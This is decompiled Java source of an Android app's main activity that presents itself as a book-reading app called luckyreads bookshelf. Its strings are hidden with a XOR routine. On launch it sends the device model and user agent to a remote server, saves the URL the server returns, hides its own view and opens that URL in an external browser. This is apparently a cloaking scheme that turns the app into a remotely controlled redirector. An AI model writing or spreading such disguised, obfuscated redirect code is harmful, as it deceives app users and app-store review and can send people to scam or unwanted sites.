package com.luckyreads.bookshelf;

import K.A0;
import K.y0;
import P0.c;
import T.t;
import W0.a;
import X0.e;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.constraintlayout.widget.ConstraintLayout;
import com.luckyreads.bookshelf.MainActivity;
import com.luckyreads.bookshelf.R;
import e1.d;
import e1.l;
import g.AbstractActivityC0125i;
import g.C0123g;
import g.C0124h;
import i1.m;
import i1.o;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import m1.g;
import m1.j;
import q1.n;

/* loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0125i {

    /* renamed from: D, reason: collision with root package name */
    public static final /* synthetic */ int f1862D = 0;

    /* renamed from: A, reason: collision with root package name */
    public final String f1863A;

    /* renamed from: B, reason: collision with root package name */
    public final c f1864B;

    /* renamed from: C, reason: collision with root package name */
    public String f1865C;

    /* renamed from: y, reason: collision with root package name */
    public final c f1866y;

    /* renamed from: z, reason: collision with root package name */
    public final String f1867z;

    public MainActivity() {
        this.d.f2374b.e("androidx:appcompat", new C0123g(this));
        h(new C0124h(this));
        final int i = 0;
        this.f1866y = new c(new a(this) { // from class: N0.a

            /* renamed from: b, reason: collision with root package name */
            public final /* synthetic */ MainActivity f614b;

            {
                this.f614b = this;
            }

            @Override // W0.a
            public final Object a() {
                int i2 = 0;
                MainActivity mainActivity = this.f614b;
                switch (i) {
                    case 0:
                        int i3 = MainActivity.f1862D;
                        KeyEvent.Callback callback = null;
                        View inflate = mainActivity.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                        ConstraintLayout constraintLayout = (ConstraintLayout) inflate;
                        if (inflate instanceof ViewGroup) {
                            ViewGroup viewGroup = (ViewGroup) inflate;
                            int childCount = viewGroup.getChildCount();
                            while (true) {
                                if (i2 < childCount) {
                                    KeyEvent.Callback findViewById = viewGroup.getChildAt(i2).findViewById(R.id.webView);
                                    if (findViewById != null) {
                                        callback = findViewById;
                                    } else {
                                        i2++;
                                    }
                                }
                            }
                        }
                        WebView webView = (WebView) callback;
                        if (webView != null) {
                            return new O0.a(constraintLayout, webView);
                        }
                        throw new NullPointerException("Missing required view with ID: ".concat(inflate.getResources().getResourceName(R.id.webView)));
                    default:
                        return mainActivity.getSharedPreferences(mainActivity.f1867z, 0);
                }
            }
        });
        this.f1867z = t(new byte[]{-94, 120, -32});
        this.f1863A = t(new byte[]{-77, 107, -11, 54});
        final int i2 = 1;
        this.f1864B = new c(new a(this) { // from class: N0.a

            /* renamed from: b, reason: collision with root package name */
            public final /* synthetic */ MainActivity f614b;

            {
                this.f614b = this;
            }

            @Override // W0.a
            public final Object a() {
                int i22 = 0;
                MainActivity mainActivity = this.f614b;
                switch (i2) {
                    case 0:
                        int i3 = MainActivity.f1862D;
                        KeyEvent.Callback callback = null;
                        View inflate = mainActivity.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                        ConstraintLayout constraintLayout = (ConstraintLayout) inflate;
                        if (inflate instanceof ViewGroup) {
                            ViewGroup viewGroup = (ViewGroup) inflate;
                            int childCount = viewGroup.getChildCount();
                            while (true) {
                                if (i22 < childCount) {
                                    KeyEvent.Callback findViewById = viewGroup.getChildAt(i22).findViewById(R.id.webView);
                                    if (findViewById != null) {
                                        callback = findViewById;
                                    } else {
                                        i22++;
                                    }
                                }
                            }
                        }
                        WebView webView = (WebView) callback;
                        if (webView != null) {
                            return new O0.a(constraintLayout, webView);
                        }
                        throw new NullPointerException("Missing required view with ID: ".concat(inflate.getResources().getResourceName(R.id.webView)));
                    default:
                        return mainActivity.getSharedPreferences(mainActivity.f1867z, 0);
                }
            }
        });
    }

    public static String t(byte[] bArr) {
        int[] iArr = {(int) 193, (int) 30, (int) 135, (int) 90};
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        int i3 = 0;
        while (i2 < length) {
            arrayList.add(Byte.valueOf((byte) (iArr[i3 % 4] ^ (bArr[i2] & 255))));
            i2++;
            i3++;
        }
        byte[] bArr2 = new byte[arrayList.size()];
        Iterator it = arrayList.iterator();
        while (it.hasNext()) {
            bArr2[i] = ((Number) it.next()).byteValue();
            i++;
        }
        return new String(bArr2, e1.a.f1910a);
    }

    @Override // g.AbstractActivityC0125i, a.l, android.app.Activity
    public final void onCreate(Bundle bundle) {
        g gVar;
        super.onCreate(bundle);
        setContentView(((O0.a) this.f1866y.a()).f618a);
        u();
        WebSettings settings = ((O0.a) this.f1866y.a()).f619b.getSettings();
        settings.setAllowContentAccess(true);
        settings.setAllowFileAccess(true);
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setMixedContentMode(0);
        settings.setDatabaseEnabled(true);
        settings.setCacheMode(-1);
        ((O0.a) this.f1866y.a()).f619b.setWebViewClient(new WebViewClient());
        WebView.setWebContentsDebuggingEnabled(false);
        g gVar2 = null;
        String string = ((SharedPreferences) this.f1864B.a()).getString(this.f1863A, null);
        if (string != null && !d.q0(string)) {
            this.f1865C = string;
            w(string);
            return;
        }
        String packageName = getPackageName();
        String t2 = t(new byte[]{-2, Byte.MAX_VALUE, -9, 42, -4});
        String str = t(new byte[]{-87, 106, -13, 42, -78, 36, -88, 117, -93, 114, -14, 63, -20, 114, -18, 55, -88, 106, -86, 98, -14, Byte.MAX_VALUE, -80, 116, -78, 123, -11, 61, -20, 109, -26, 44, -74, 113, -11, 49, -17, 105, -24, 40, -86, 123, -11, 41, -17, 122, -30, 44, -18}) + t2 + packageName;
        o oVar = new o();
        t tVar = new t(4);
        e.e(str, "url");
        if (l.i0(str, "ws:", true)) {
            String substring = str.substring(3);
            e.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (l.i0(str, "wss:", true)) {
            String substring2 = str.substring(4);
            e.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        e.e(str, "<this>");
        i1.l lVar = new i1.l();
        lVar.c(null, str);
        tVar.f742a = lVar.a();
        String t3 = t(new byte[]{-103, 51, -61, 63, -73, 119, -28, 63, -20, 83, -24, 62, -92, 114});
        String str2 = Build.MODEL;
        e.d(str2, "MODEL");
        tVar.l(t3, str2);
        tVar.l(t(new byte[]{Byte.MIN_VALUE, 125, -28, 63, -79, 106, -86, 22, -96, 112, -32, 47, -96, 121, -30}), t(new byte[]{-92, 112, -86, 15, -110, 50, -30, 52, -6, 111, -70, 106, -17, 39}));
        String t4 = t(new byte[]{-108, 109, -30, 40, -20, 95, -32, 63, -81, 106});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        e.d(defaultUserAgent, "getDefaultUserAgent(...)");
        tVar.l(t4, defaultUserAgent);
        H.e b2 = tVar.b();
        j jVar = new j(oVar, b2);
        B0.d dVar = new B0.d(9, this);
        if (!jVar.f3210e.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        n nVar = n.f3550a;
        jVar.f3211f = n.f3550a.g();
        t tVar2 = oVar.f2458a;
        g gVar3 = new g(jVar, dVar);
        tVar2.getClass();
        synchronized (tVar2) {
            ((ArrayDeque) tVar2.f743b).add(gVar3);
            String str3 = ((m) b2.f213c).d;
            Iterator it = ((ArrayDeque) tVar2.f744c).iterator();
            while (true) {
                if (it.hasNext()) {
                    gVar = (g) it.next();
                    if (e.a(((m) gVar.f3204c.f3208b.f213c).d, str3)) {
                        break;
                    }
                } else {
                    Iterator it2 = ((ArrayDeque) tVar2.f743b).iterator();
                    while (it2.hasNext()) {
                        gVar = (g) it2.next();
                        if (e.a(((m) gVar.f3204c.f3208b.f213c).d, str3)) {
                        }
                    }
                }
            }
            gVar2 = gVar;
            if (gVar2 != null) {
                gVar3.f3203b = gVar2.f3203b;
            }
        }
        tVar2.r();
    }

    @Override // g.AbstractActivityC0125i, android.app.Activity
    public final void onResume() {
        super.onResume();
        String str = this.f1865C;
        if (str != null) {
            w(str);
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            u();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public final void u() {
        y0 y0Var;
        WindowInsetsController insetsController;
        q1.d.m0(getWindow(), false);
        Window window = getWindow();
        B0.d dVar = new B0.d(getWindow().getDecorView());
        if (Build.VERSION.SDK_INT >= 30) {
            insetsController = window.getInsetsController();
            A0 a02 = new A0(insetsController, dVar);
            a02.f368f = window;
            y0Var = a02;
        } else {
            y0Var = new y0(window, dVar);
        }
        y0Var.P();
        y0Var.p0();
    }

    public final void v() {
        WebView webView = ((O0.a) this.f1866y.a()).f619b;
        webView.setVisibility(0);
        webView.loadUrl(t(new byte[]{-89, 119, -21, 63, -5, 49, -88, 117, -96, 112, -29, 40, -82, 119, -29, 5, -96, 109, -12, 63, -75, 49, -18, 52, -91, 123, -1, 116, -87, 106, -22, 54}));
    }

    public final void w(String str) {
        ((O0.a) this.f1866y.a()).f619b.setVisibility(8);
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            v();
        }
    }
}
